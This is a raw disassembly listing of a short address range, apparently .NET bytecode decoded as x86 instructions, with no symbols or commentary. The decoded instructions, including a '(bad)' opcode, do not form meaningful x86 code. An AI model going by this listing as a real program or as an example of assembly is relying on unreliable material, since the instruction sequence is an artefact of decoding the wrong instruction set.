  403cdf:	00 14 00             	add    %dl,(%eax,%eax,1)
  403ce2:	00 11                	add    %dl,(%ecx)
  403ce4:	02 7b 40             	add    0x40(%ebx),%bh
  403ce7:	00 00                	add    %al,(%eax)
  403ce9:	04 0a                	add    $0xa,%al
  403ceb:	06                   	push   %es
  403cec:	2c 68                	sub    $0x68,%al
  403cee:	17                   	pop    %ss
  403cef:	8d 2e                	lea    (%esi),%ebp
  403cf1:	00 00                	add    %al,(%eax)
  403cf3:	01 25 16 17 9c 0b    	add    %esp,0xb9c1716
  403cf9:	02 7b 42             	add    0x42(%ebx),%bh
  403cfc:	00 00                	add    %al,(%eax)
  403cfe:	04 02                	add    $0x2,%al
  403d00:	7b 42                	jnp    0x403d44
  403d02:	00 00                	add    %al,(%eax)
  403d04:	04 7b                	add    $0x7b,%al
  403d06:	47                   	inc    %edi
  403d07:	00 00                	add    %al,(%eax)
  403d09:	04 02                	add    $0x2,%al
  403d0b:	7b 43                	jnp    0x403d50
  403d0d:	00 00                	add    %al,(%eax)
  403d0f:	04 17                	add    $0x17,%al
  403d11:	6f                   	outsl  %ds:(%esi),(%dx)
  403d12:	4a                   	dec    %edx
  403d13:	00 00                	add    %al,(%eax)
  403d15:	06                   	push   %es
  403d16:	7d 4a                	jge    0x403d62
  403d18:	00 00                	add    %al,(%eax)
  403d1a:	04 02                	add    $0x2,%al
  403d1c:	7b 42                	jnp    0x403d60
  403d1e:	00 00                	add    %al,(%eax)
  403d20:	04 07                	add    $0x7,%al
  403d22:	6f                   	outsl  %ds:(%esi),(%dx)
  403d23:	32 00                	xor    (%eax),%al
  403d25:	00 06                	add    %al,(%esi)
  403d27:	6f                   	outsl  %ds:(%esi),(%dx)
  403d28:	2b 00                	sub    (%eax),%eax
  403d2a:	00 0a                	add    %cl,(%edx)
  403d2c:	0c 12                	or     $0x12,%al
  403d2e:	02 28                	add    (%eax),%ch
  403d30:	2c 00                	sub    $0x0,%al
  403d32:	00 0a                	add    %cl,(%edx)
  403d34:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  403d39:	0a 7d 40             	or     0x40(%ebp),%bh
  403d3c:	00 00                	add    %al,(%eax)
  403d3e:	04 02                	add    $0x2,%al
  403d40:	08 7d 44             	or     %bh,0x44(%ebp)
  403d43:	00 00                	add    %al,(%eax)
  403d45:	04 02                	add    $0x2,%al
  403d47:	7c 41                	jl     0x403d8a
  403d49:	00 00                	add    %al,(%eax)
  403d4b:	04 12                	add    $0x12,%al
  403d4d:	02 02                	add    (%edx),%al
  403d4f:	28 1f                	sub    %bl,(%edi)
  403d51:	00 00                	add    %al,(%eax)
  403d53:	2b de                	sub    %esi,%ebx
  403d55:	50                   	push   %eax
  403d56:	02 7b 44             	add    0x44(%ebx),%bh
  403d59:	00 00                	add    %al,(%eax)
  403d5b:	04 0c                	add    $0xc,%al
  403d5d:	02 7c 44 00          	add    0x0(%esp,%eax,2),%bh
  403d61:	00 04 fe             	add    %al,(%esi,%edi,8)
  403d64:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403d69:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403d6f:	00 00                	add    %al,(%eax)
  403d71:	04 12                	add    $0x12,%al
  403d73:	02 28                	add    (%eax),%ch
  403d75:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  403d7a:	de 17                	ficoms (%edi)
  403d7c:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  403d81:	40                   	inc    %eax
  403d82:	00 00                	add    %al,(%eax)
  403d84:	04 02                	add    $0x2,%al
  403d86:	7c 41                	jl     0x403dc9
  403d88:	00 00                	add    %al,(%eax)
  403d8a:	04 09                	add    $0x9,%al
  403d8c:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  403d92:	13 02                	adc    (%edx),%eax
  403d94:	1f                   	pop    %ds
  403d95:	fe                   	(bad)
  403d96:	7d 40                	jge    0x403dd8
  403d98:	00 00                	add    %al,(%eax)
  403d9a:	04 02                	add    $0x2,%al
  403d9c:	7c 41                	jl     0x403ddf
  403d9e:	00 00                	add    %al,(%eax)
  403da0:	04 28                	add    $0x28,%al
  403da2:	3e 00 00             	add    %al,%ds:(%eax)
  403da5:	0a 2a                	or     (%edx),%ch
  403da7:	00 01                	add    %al,(%ecx)
  403da9:	10 00                	adc    %al,(%eax)
  403dab:	00 00                	add    %al,(%eax)
  403dad:	00 07                	add    %al,(%edi)
  403daf:	00 91 98 00 17 0b    	add    %dl,0xb170098(%ecx)
  403db5:	00 00                	add    %al,(%eax)
  403db7:	01 13                	add    %edx,(%ebx)
  403db9:	30 02                	xor    %al,(%edx)
  403dbb:	00 2b                	add    %ch,(%ebx)
  403dbd:	00 00                	add    %al,(%eax)
  403dbf:	00 15 00 00 11 12    	add    %dl,0x12110000
  403dc5:	00 28                	add    %ch,(%eax)
  403dc7:	6e                   	outsb  %ds:(%esi),(%dx)
  403dc8:	00 00                	add    %al,(%eax)
  403dca:	0a 7d 60             	or     0x60(%ebp),%bh
  403dcd:	00 00                	add    %al,(%eax)
  403dcf:	04 12                	add    $0x12,%al
  403dd1:	00 02                	add    %al,(%edx)
  403dd3:	7d 61                	jge    0x403e36
  403dd5:	00 00                	add    %al,(%eax)
  403dd7:	04 12                	add    $0x12,%al
  403dd9:	00 15 7d 5f 00 00    	add    %dl,0x5f7d
  403ddf:	04 12                	add    $0x12,%al
  403de1:	00 7c 60 00          	add    %bh,0x0(%eax,%eiz,2)
  403de5:	00 04 12             	add    %al,(%edx,%edx,1)
  403de8:	00 28                	add    %ch,(%eax)
  403dea:	20 00                	and    %al,(%eax)
  403dec:	00 2b                	add    %ch,(%ebx)
  403dee:	2a 00                	sub    (%eax),%al
  403df0:	13 30                	adc    (%eax),%esi
  403df2:	02 00                	add    (%eax),%al
  403df4:	4f                   	dec    %edi
  403df5:	00 00                	add    %al,(%eax)
  403df7:	00 16                	add    %dl,(%esi)
  403df9:	00 00                	add    %al,(%eax)
  403dfb:	11 12                	adc    %edx,(%edx)
  403dfd:	00 28                	add    %ch,(%eax)
  403dff:	70 00                	jo     0x403e01
  403e01:	00 0a                	add    %cl,(%edx)
  403e03:	7d 55                	jge    0x403e5a
  403e05:	00 00                	add    %al,(%eax)
  403e07:	04 12                	add    $0x12,%al
  403e09:	00 02                	add    %al,(%edx)
  403e0b:	7d 56                	jge    0x403e63
  403e0d:	00 00                	add    %al,(%eax)
  403e0f:	04 12                	add    $0x12,%al
  403e11:	00 03                	add    %al,(%ebx)
  403e13:	7d 57                	jge    0x403e6c
  403e15:	00 00                	add    %al,(%eax)
  403e17:	04 12                	add    $0x12,%al
  403e19:	00 04 7d 59 00 00 04 	add    %al,0x4000059(,%edi,2)
  403e20:	12 00                	adc    (%eax),%al
  403e22:	05 7d 58 00 00       	add    $0x587d,%eax
  403e27:	04 12                	add    $0x12,%al
  403e29:	00 15 7d 54 00 00    	add    %dl,0x547d
  403e2f:	04 12                	add    $0x12,%al
  403e31:	00 7c 55 00          	add    %bh,0x0(%ebp,%edx,2)
  403e35:	00 04 12             	add    %al,(%edx,%edx,1)
  403e38:	00 28                	add    %ch,(%eax)
  403e3a:	21 00                	and    %eax,(%eax)
  403e3c:	00 2b                	add    %ch,(%ebx)
  403e3e:	12 00                	adc    (%eax),%al
  403e40:	7c 55                	jl     0x403e97
  403e42:	00 00                	add    %al,(%eax)
  403e44:	04 28                	add    $0x28,%al
  403e46:	72 00                	jb     0x403e48
  403e48:	00 0a                	add    %cl,(%edx)
  403e4a:	2a 00                	sub    (%eax),%al
  403e4c:	1b 30                	sbb    (%eax),%esi
  403e4e:	01 00                	add    %eax,(%eax)
  403e50:	1a 00                	sbb    (%eax),%al
  403e52:	00 00                	add    %al,(%eax)
  403e54:	17                   	pop    %ss
  403e55:	00 00                	add    %al,(%eax)
  403e57:	11 02                	adc    %eax,(%edx)
  403e59:	7b 47                	jnp    0x403ea2
  403e5b:	00 00                	add    %al,(%eax)
  403e5d:	04 7b                	add    $0x7b,%al
  403e5f:	6f                   	outsl  %ds:(%esi),(%dx)
  403e60:	00 00                	add    %al,(%eax)
  403e62:	04 6f                	add    $0x6f,%al
  403e64:	73 00                	jae    0x403e66
  403e66:	00 0a                	add    %cl,(%edx)
  403e68:	0a de                	or     %dh,%bl
  403e6a:	05 26 16 0a de       	add    $0xde0a1626,%eax
  403e6f:	00 06                	add    %al,(%esi)
  403e71:	2a 00                	sub    (%eax),%al
  403e73:	00 01                	add    %al,(%ecx)
  403e75:	10 00                	adc    %al,(%eax)
  403e77:	00 00                	add    %al,(%eax)
  403e79:	00 00                	add    %al,(%eax)
  403e7b:	00 13                	add    %dl,(%ebx)
  403e7d:	13 00                	adc    (%eax),%eax
  403e7f:	05 01 00 00 01       	add    $0x1000001,%eax
  403e84:	13 30                	adc    (%eax),%esi
  403e86:	02 00                	add    (%eax),%al
  403e88:	37                   	aaa
  403e89:	00 00                	add    %al,(%eax)
  403e8b:	00 18                	add    %bl,(%eax)
  403e8d:	00 00                	add    %al,(%eax)
  403e8f:	11 12                	adc    %edx,(%edx)
  403e91:	00 28                	add    %ch,(%eax)
  403e93:	74 00                	je     0x403e95
  403e95:	00 0a                	add    %cl,(%edx)
  403e97:	7d 64                	jge    0x403efd
  403e99:	00 00                	add    %al,(%eax)
  403e9b:	04 12                	add    $0x12,%al
  403e9d:	00 02                	add    %al,(%edx)
  403e9f:	7d 65                	jge    0x403f06
  403ea1:	00 00                	add    %al,(%eax)
  403ea3:	04 12                	add    $0x12,%al
  403ea5:	00 15 7d 63 00 00    	add    %dl,0x637d
  403eab:	04 12                	add    $0x12,%al
  403ead:	00 7c 64 00          	add    %bh,0x0(%esp,%eiz,2)
  403eb1:	00 04 12             	add    %al,(%edx,%edx,1)
  403eb4:	00 28                	add    %ch,(%eax)
  403eb6:	22 00                	and    (%eax),%al
  403eb8:	00 2b                	add    %ch,(%ebx)
  403eba:	12 00                	adc    (%eax),%al
  403ebc:	7c 64                	jl     0x403f22
  403ebe:	00 00                	add    %al,(%eax)
  403ec0:	04 28                	add    $0x28,%al
  403ec2:	76 00                	jbe    0x403ec4
  403ec4:	00 0a                	add    %cl,(%edx)
  403ec6:	2a 00                	sub    (%eax),%al
  403ec8:	13 30                	adc    (%eax),%esi
  403eca:	02 00                	add    (%eax),%al
  403ecc:	3f                   	aas
  403ecd:	00 00                	add    %al,(%eax)
  403ecf:	00 19                	add    %bl,(%ecx)
  403ed1:	00 00                	add    %al,(%eax)
  403ed3:	11 12                	adc    %edx,(%edx)
  403ed5:	00 28                	add    %ch,(%eax)
  403ed7:	77 00                	ja     0x403ed9
  403ed9:	00 0a                	add    %cl,(%edx)
  403edb:	7d 68                	jge    0x403f45
  403edd:	00 00                	add    %al,(%eax)
  403edf:	04 12                	add    $0x12,%al
  403ee1:	00 02                	add    %al,(%edx)
  403ee3:	7d 69                	jge    0x403f4e
  403ee5:	00 00                	add    %al,(%eax)
  403ee7:	04 12                	add    $0x12,%al
  403ee9:	00 03                	add    %al,(%ebx)
  403eeb:	7d 6a                	jge    0x403f57
  403eed:	00 00                	add    %al,(%eax)
  403eef:	04 12                	add    $0x12,%al
  403ef1:	00 15 7d 67 00 00    	add    %dl,0x677d
  403ef7:	04 12                	add    $0x12,%al
  403ef9:	00 7c 68 00          	add    %bh,0x0(%eax,%ebp,2)
  403efd:	00 04 12             	add    %al,(%edx,%edx,1)
  403f00:	00 28                	add    %ch,(%eax)
  403f02:	23 00                	and    (%eax),%eax
  403f04:	00 2b                	add    %ch,(%ebx)
  403f06:	12 00                	adc    (%eax),%al
  403f08:	7c 68                	jl     0x403f72
  403f0a:	00 00                	add    %al,(%eax)
  403f0c:	04 28                	add    $0x28,%al
  403f0e:	79 00                	jns    0x403f10
  403f10:	00 0a                	add    %cl,(%edx)
  403f12:	2a 00                	sub    (%eax),%al
  403f14:	13 30                	adc    (%eax),%esi
  403f16:	02 00                	add    (%eax),%al
  403f18:	47                   	inc    %edi
  403f19:	00 00                	add    %al,(%eax)
  403f1b:	00 1a                	add    %bl,(%edx)
  403f1d:	00 00                	add    %al,(%eax)
  403f1f:	11 12                	adc    %edx,(%edx)
  403f21:	00 28                	add    %ch,(%eax)
  403f23:	77 00                	ja     0x403f25
  403f25:	00 0a                	add    %cl,(%edx)
  403f27:	7d 4d                	jge    0x403f76
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	04 12                	add    $0x12,%al
  403f2d:	00 02                	add    %al,(%edx)
  403f2f:	7d 4e                	jge    0x403f7f
  403f31:	00 00                	add    %al,(%eax)
  403f33:	04 12                	add    $0x12,%al
  403f35:	00 03                	add    %al,(%ebx)
  403f37:	7d 4f                	jge    0x403f88
  403f39:	00 00                	add    %al,(%eax)
  403f3b:	04 12                	add    $0x12,%al
  403f3d:	00 04 7d 50 00 00 04 	add    %al,0x4000050(,%edi,2)
  403f44:	12 00                	adc    (%eax),%al
  403f46:	15 7d 4c 00 00       	adc    $0x4c7d,%eax
  403f4b:	04 12                	add    $0x12,%al
  403f4d:	00 7c 4d 00          	add    %bh,0x0(%ebp,%ecx,2)
  403f51:	00 04 12             	add    %al,(%edx,%edx,1)
  403f54:	00 28                	add    %ch,(%eax)
  403f56:	24 00                	and    $0x0,%al
  403f58:	00 2b                	add    %ch,(%ebx)
  403f5a:	12 00                	adc    (%eax),%al
  403f5c:	7c 4d                	jl     0x403fab
  403f5e:	00 00                	add    %al,(%eax)
  403f60:	04 28                	add    $0x28,%al
  403f62:	79 00                	jns    0x403f64
  403f64:	00 0a                	add    %cl,(%edx)
  403f66:	2a 00                	sub    (%eax),%al
  403f68:	1b 30                	sbb    (%eax),%esi
  403f6a:	04 00                	add    $0x0,%al
  403f6c:	92                   	xchg   %eax,%edx
  403f6d:	03 00                	add    (%eax),%eax
  403f6f:	00 1b                	add    %bl,(%ebx)
  403f71:	00 00                	add    %al,(%eax)
  403f73:	11 02                	adc    %eax,(%edx)
  403f75:	7b 4c                	jnp    0x403fc3
  403f77:	00 00                	add    %al,(%eax)
  403f79:	04 0a                	add    $0xa,%al
  403f7b:	02 7b 4e             	add    0x4e(%ebx),%bh
  403f7e:	00 00                	add    %al,(%eax)
  403f80:	04 0b                	add    $0xb,%al
  403f82:	06                   	push   %es
  403f83:	1b 36                	sbb    (%esi),%esi
  403f85:	17                   	pop    %ss
  403f86:	02 1d 8d 2e 00 00    	add    0x2e8d,%bl
  403f8c:	01 25 d0 cf 00 00    	add    %esp,0xcfd0
  403f92:	04 28                	add    $0x28,%al
  403f94:	7a 00                	jp     0x403f96
  403f96:	00 0a                	add    %cl,(%edx)
  403f98:	7d 51                	jge    0x403feb
  403f9a:	00 00                	add    %al,(%eax)
  403f9c:	04 00                	add    $0x0,%al
  403f9e:	06                   	push   %es
  403f9f:	45                   	inc    %ebp
  403fa0:	06                   	push   %es
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	00 4f 00             	add    %cl,0x0(%edi)
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	b4 00                	mov    $0x0,%ah
  403faa:	00 00                	add    %al,(%eax)
  403fac:	20 01                	and    %al,(%ecx)
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	b6 01                	mov    $0x1,%dh
  403fb2:	00 00                	add    %al,(%eax)
  403fb4:	2d 02 00 00 cb       	sub    $0xcb000002,%eax
  403fb9:	02 00                	add    (%eax),%al
  403fbb:	00 07                	add    %al,(%edi)
  403fbd:	7b 47                	jnp    0x404006
  403fbf:	00 00                	add    %al,(%eax)
  403fc1:	04 20                	add    $0x20,%al
  403fc3:	88 13                	mov    %dl,(%ebx)
  403fc5:	00 00                	add    %al,(%eax)
  403fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc8:	4c                   	dec    %esp
  403fc9:	00 00                	add    %al,(%eax)
  403fcb:	06                   	push   %es
  403fcc:	07                   	pop    %es
  403fcd:	7b 47                	jnp    0x404016
  403fcf:	00 00                	add    %al,(%eax)
  403fd1:	04 6f                	add    $0x6f,%al
  403fd3:	49                   	dec    %ecx
  403fd4:	00 00                	add    %al,(%eax)
  403fd6:	06                   	push   %es
  403fd7:	6f                   	outsl  %ds:(%esi),(%dx)
  403fd8:	23 00                	and    (%eax),%eax
  403fda:	00 0a                	add    %cl,(%edx)
  403fdc:	13 04 12             	adc    (%edx,%edx,1),%eax
  403fdf:	04 28                	add    $0x28,%al
  403fe1:	24 00                	and    $0x0,%al
  403fe3:	00 0a                	add    %cl,(%edx)
  403fe5:	2d 41 02 16 25       	sub    $0x25160241,%eax
  403fea:	0a 7d 4c             	or     0x4c(%ebp),%bh
  403fed:	00 00                	add    %al,(%eax)
  403fef:	04 02                	add    $0x2,%al
  403ff1:	11 04 7d 52 00 00 04 	adc    %eax,0x4000052(,%edi,2)
  403ff8:	02 7c 4d 00          	add    0x0(%ebp,%ecx,2),%bh
  403ffc:	00 04 12             	add    %al,(%edx,%edx,1)
  403fff:	04 02                	add    $0x2,%al
  404001:	28 25 00 00 2b dd    	sub    %ah,0xdd2b0000
  404007:	fa                   	cli
  404008:	02 00                	add    (%eax),%al
  40400a:	00 02                	add    %al,(%edx)
  40400c:	7b 52                	jnp    0x404060
  40400e:	00 00                	add    %al,(%eax)
  404010:	04 13                	add    $0x13,%al
  404012:	04 02                	add    $0x2,%al
  404014:	7c 52                	jl     0x404068
  404016:	00 00                	add    %al,(%eax)
  404018:	04 fe                	add    $0xfe,%al
  40401a:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  40401f:	02 15 25 0a 7d 4c    	add    0x4c7d0a25,%dl
  404025:	00 00                	add    %al,(%eax)
  404027:	04 12                	add    $0x12,%al
  404029:	04 28                	add    $0x28,%al
  40402b:	26 00 00             	add    %al,%es:(%eax)
  40402e:	0a 0d 07 7b 47 00    	or     0x477b07,%cl
  404034:	00 04 09             	add    %al,(%ecx,%ecx,1)
  404037:	6f                   	outsl  %ds:(%esi),(%dx)
  404038:	48                   	dec    %eax
  404039:	00 00                	add    %al,(%eax)
  40403b:	06                   	push   %es
  40403c:	6f                   	outsl  %ds:(%esi),(%dx)
  40403d:	2b 00                	sub    (%eax),%eax
  40403f:	00 0a                	add    %cl,(%edx)
  404041:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  404047:	00 00                	add    %al,(%eax)
  404049:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  40404f:	0a 7d 4c             	or     0x4c(%ebp),%bh
  404052:	00 00                	add    %al,(%eax)
  404054:	04 02                	add    $0x2,%al
  404056:	11 05 7d 53 00 00    	adc    %eax,0x537d
  40405c:	04 02                	add    $0x2,%al
  40405e:	7c 4d                	jl     0x4040ad
  404060:	00 00                	add    %al,(%eax)
  404062:	04 12                	add    $0x12,%al
  404064:	05 02 28 26 00       	add    $0x262802,%eax
  404069:	00 2b                	add    %ch,(%ebx)
  40406b:	dd 95 02 00 00 02    	fstl   0x2000002(%ebp)
  404071:	7b 53                	jnp    0x4040c6
  404073:	00 00                	add    %al,(%eax)
  404075:	04 13                	add    $0x13,%al
  404077:	05 02 7c 53 00       	add    $0x537c02,%eax
  40407c:	00 04 fe             	add    %al,(%esi,%edi,8)
  40407f:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  404084:	02 15 25 0a 7d 4c    	add    0x4c7d0a25,%dl
  40408a:	00 00                	add    %al,(%eax)
  40408c:	04 12                	add    $0x12,%al
  40408e:	05 28 2d 00 00       	add    $0x2d28,%eax
  404093:	0a 2d 07 16 0c dd    	or     0xdd0c1607,%ch
  404099:	4d                   	dec    %ebp
  40409a:	02 00                	add    (%eax),%al
  40409c:	00 07                	add    %al,(%edi)
  40409e:	7b 47                	jnp    0x4040e7
  4040a0:	00 00                	add    %al,(%eax)
  4040a2:	04 6f                	add    $0x6f,%al
  4040a4:	49                   	dec    %ecx
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	06                   	push   %es
  4040a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a9:	23 00                	and    (%eax),%eax
  4040ab:	00 0a                	add    %cl,(%edx)
  4040ad:	13 04 12             	adc    (%edx,%edx,1),%eax
  4040b0:	04 28                	add    $0x28,%al
  4040b2:	24 00                	and    $0x0,%al
  4040b4:	00 0a                	add    %cl,(%edx)
  4040b6:	2d 41 02 18 25       	sub    $0x25180241,%eax
  4040bb:	0a 7d 4c             	or     0x4c(%ebp),%bh
  4040be:	00 00                	add    %al,(%eax)
  4040c0:	04 02                	add    $0x2,%al
  4040c2:	11 04 7d 52 00 00 04 	adc    %eax,0x4000052(,%edi,2)
  4040c9:	02 7c 4d 00          	add    0x0(%ebp,%ecx,2),%bh
  4040cd:	00 04 12             	add    %al,(%edx,%edx,1)
  4040d0:	04 02                	add    $0x2,%al
  4040d2:	28 25 00 00 2b dd    	sub    %ah,0xdd2b0000
  4040d8:	29 02                	sub    %eax,(%edx)
  4040da:	00 00                	add    %al,(%eax)
  4040dc:	02 7b 52             	add    0x52(%ebx),%bh
  4040df:	00 00                	add    %al,(%eax)
  4040e1:	04 13                	add    $0x13,%al
  4040e3:	04 02                	add    $0x2,%al
  4040e5:	7c 52                	jl     0x404139
  4040e7:	00 00                	add    %al,(%eax)
  4040e9:	04 fe                	add    $0xfe,%al
  4040eb:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4040f0:	02 15 25 0a 7d 4c    	add    0x4c7d0a25,%dl
  4040f6:	00 00                	add    %al,(%eax)
  4040f8:	04 12                	add    $0x12,%al
  4040fa:	04 28                	add    $0x28,%al
  4040fc:	26 00 00             	add    %al,%es:(%eax)
  4040ff:	0a 0d 07 7b 47 00    	or     0x477b07,%cl
  404105:	00 04 6f             	add    %al,(%edi,%ebp,2)
  404108:	4d                   	dec    %ebp
  404109:	00 00                	add    %al,(%eax)
  40410b:	06                   	push   %es
  40410c:	07                   	pop    %es
  40410d:	02 7b 51             	add    0x51(%ebx),%bh
  404110:	00 00                	add    %al,(%eax)
  404112:	04 09                	add    $0x9,%al
  404114:	28 33                	sub    %dh,(%ebx)
  404116:	00 00                	add    %al,(%eax)
  404118:	06                   	push   %es
  404119:	39 a3 01 00 00 07    	cmp    %esp,0x7000001(%ebx)
  40411f:	7b 47                	jnp    0x404168
  404121:	00 00                	add    %al,(%eax)
  404123:	04 02                	add    $0x2,%al
  404125:	7b 4f                	jnp    0x404176
  404127:	00 00                	add    %al,(%eax)
  404129:	04 6f                	add    $0x6f,%al
  40412b:	4b                   	dec    %ebx
  40412c:	00 00                	add    %al,(%eax)
  40412e:	06                   	push   %es
  40412f:	13 06                	adc    (%esi),%eax
  404131:	07                   	pop    %es
  404132:	7b 47                	jnp    0x40417b
  404134:	00 00                	add    %al,(%eax)
  404136:	04 11                	add    $0x11,%al
  404138:	06                   	push   %es
  404139:	6f                   	outsl  %ds:(%esi),(%dx)
  40413a:	48                   	dec    %eax
  40413b:	00 00                	add    %al,(%eax)
  40413d:	06                   	push   %es
  40413e:	6f                   	outsl  %ds:(%esi),(%dx)
  40413f:	2b 00                	sub    (%eax),%eax
  404141:	00 0a                	add    %cl,(%edx)
  404143:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  404149:	00 00                	add    %al,(%eax)
  40414b:	0a 2d 41 02 19 25    	or     0x25190241,%ch
  404151:	0a 7d 4c             	or     0x4c(%ebp),%bh
  404154:	00 00                	add    %al,(%eax)
  404156:	04 02                	add    $0x2,%al
  404158:	11 05 7d 53 00 00    	adc    %eax,0x537d
  40415e:	04 02                	add    $0x2,%al
  404160:	7c 4d                	jl     0x4041af
  404162:	00 00                	add    %al,(%eax)
  404164:	04 12                	add    $0x12,%al
  404166:	05 02 28 26 00       	add    $0x262802,%eax
  40416b:	00 2b                	add    %ch,(%ebx)
  40416d:	dd 93 01 00 00 02    	fstl   0x2000001(%ebx)
  404173:	7b 53                	jnp    0x4041c8
  404175:	00 00                	add    %al,(%eax)
  404177:	04 13                	add    $0x13,%al
  404179:	05 02 7c 53 00       	add    $0x537c02,%eax
  40417e:	00 04 fe             	add    %al,(%esi,%edi,8)
  404181:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  404186:	02 15 25 0a 7d 4c    	add    0x4c7d0a25,%dl
  40418c:	00 00                	add    %al,(%eax)
  40418e:	04 12                	add    $0x12,%al
  404190:	05 28 2d 00 00       	add    $0x2d28,%eax
  404195:	0a 2d 07 16 0c dd    	or     0xdd0c1607,%ch
  40419b:	4b                   	dec    %ebx
  40419c:	01 00                	add    %eax,(%eax)
  40419e:	00 02                	add    %al,(%edx)
  4041a0:	7b 4f                	jnp    0x4041f1
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	04 3a                	add    $0x3a,%al
  4041a6:	80 00 00             	addb   $0x0,(%eax)
  4041a9:	00 07                	add    %al,(%edi)
  4041ab:	7b 47                	jnp    0x4041f4
  4041ad:	00 00                	add    %al,(%eax)
  4041af:	04 6f                	add    $0x6f,%al
  4041b1:	49                   	dec    %ecx
  4041b2:	00 00                	add    %al,(%eax)
  4041b4:	06                   	push   %es
  4041b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b6:	23 00                	and    (%eax),%eax
  4041b8:	00 0a                	add    %cl,(%edx)
  4041ba:	13 04 12             	adc    (%edx,%edx,1),%eax
  4041bd:	04 28                	add    $0x28,%al
  4041bf:	24 00                	and    $0x0,%al
  4041c1:	00 0a                	add    %cl,(%edx)
  4041c3:	2d 41 02 1a 25       	sub    $0x251a0241,%eax
  4041c8:	0a 7d 4c             	or     0x4c(%ebp),%bh
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	04 02                	add    $0x2,%al
  4041cf:	11 04 7d 52 00 00 04 	adc    %eax,0x4000052(,%edi,2)
  4041d6:	02 7c 4d 00          	add    0x0(%ebp,%ecx,2),%bh
  4041da:	00 04 12             	add    %al,(%edx,%edx,1)
  4041dd:	04 02                	add    $0x2,%al
  4041df:	28 25 00 00 2b dd    	sub    %ah,0xdd2b0000
  4041e5:	1c 01                	sbb    $0x1,%al
  4041e7:	00 00                	add    %al,(%eax)
  4041e9:	02 7b 52             	add    0x52(%ebx),%bh
  4041ec:	00 00                	add    %al,(%eax)
  4041ee:	04 13                	add    $0x13,%al
  4041f0:	04 02                	add    $0x2,%al
  4041f2:	7c 52                	jl     0x404246
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	04 fe                	add    $0xfe,%al
  4041f8:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4041fd:	02 15 25 0a 7d 4c    	add    0x4c7d0a25,%dl
  404203:	00 00                	add    %al,(%eax)
  404205:	04 12                	add    $0x12,%al
  404207:	04 28                	add    $0x28,%al
  404209:	26 00 00             	add    %al,%es:(%eax)
  40420c:	0a 0d 07 7b 47 00    	or     0x477b07,%cl
  404212:	00 04 09             	add    %al,(%ecx,%ecx,1)
  404215:	16                   	push   %ss
  404216:	6f                   	outsl  %ds:(%esi),(%dx)
  404217:	4a                   	dec    %edx
  404218:	00 00                	add    %al,(%eax)
  40421a:	06                   	push   %es
  40421b:	13 07                	adc    (%edi),%eax
  40421d:	07                   	pop    %es
  40421e:	11 07                	adc    %eax,(%edi)
  404220:	7d 49                	jge    0x40426b
  404222:	00 00                	add    %al,(%eax)
  404224:	04 38                	add    $0x38,%al
  404226:	87 00                	xchg   %eax,(%eax)
  404228:	00 00                	add    %al,(%eax)
  40422a:	07                   	pop    %es
  40422b:	02 7b 50             	add    0x50(%ebx),%bh
  40422e:	00 00                	add    %al,(%eax)
  404230:	04 7d                	add    $0x7d,%al
  404232:	49                   	dec    %ecx
  404233:	00 00                	add    %al,(%eax)
  404235:	04 07                	add    $0x7,%al
  404237:	7b 47                	jnp    0x404280
  404239:	00 00                	add    %al,(%eax)
  40423b:	04 02                	add    $0x2,%al
  40423d:	7b 50                	jnp    0x40428f
  40423f:	00 00                	add    %al,(%eax)
  404241:	04 6f                	add    $0x6f,%al
  404243:	4b                   	dec    %ebx
  404244:	00 00                	add    %al,(%eax)
  404246:	06                   	push   %es
  404247:	13 08                	adc    (%eax),%ecx
  404249:	07                   	pop    %es
  40424a:	7b 47                	jnp    0x404293
  40424c:	00 00                	add    %al,(%eax)
  40424e:	04 11                	add    $0x11,%al
  404250:	08 6f 48             	or     %ch,0x48(%edi)
  404253:	00 00                	add    %al,(%eax)
  404255:	06                   	push   %es
  404256:	6f                   	outsl  %ds:(%esi),(%dx)
  404257:	2b 00                	sub    (%eax),%eax
  404259:	00 0a                	add    %cl,(%edx)
  40425b:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  404261:	00 00                	add    %al,(%eax)
  404263:	0a 2d 3e 02 1b 25    	or     0x251b023e,%ch
  404269:	0a 7d 4c             	or     0x4c(%ebp),%bh
  40426c:	00 00                	add    %al,(%eax)
  40426e:	04 02                	add    $0x2,%al
  404270:	11 05 7d 53 00 00    	adc    %eax,0x537d
  404276:	04 02                	add    $0x2,%al
  404278:	7c 4d                	jl     0x4042c7
  40427a:	00 00                	add    %al,(%eax)
  40427c:	04 12                	add    $0x12,%al
  40427e:	05 02 28 26 00       	add    $0x262802,%eax
  404283:	00 2b                	add    %ch,(%ebx)
  404285:	de 7e 02             	fidivrs 0x2(%esi)
  404288:	7b 53                	jnp    0x4042dd
  40428a:	00 00                	add    %al,(%eax)
  40428c:	04 13                	add    $0x13,%al
  40428e:	05 02 7c 53 00       	add    $0x537c02,%eax
  404293:	00 04 fe             	add    %al,(%esi,%edi,8)
  404296:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40429b:	02 15 25 0a 7d 4c    	add    0x4c7d0a25,%dl
  4042a1:	00 00                	add    %al,(%eax)
  4042a3:	04 12                	add    $0x12,%al
  4042a5:	05 28 2d 00 00       	add    $0x2d28,%eax
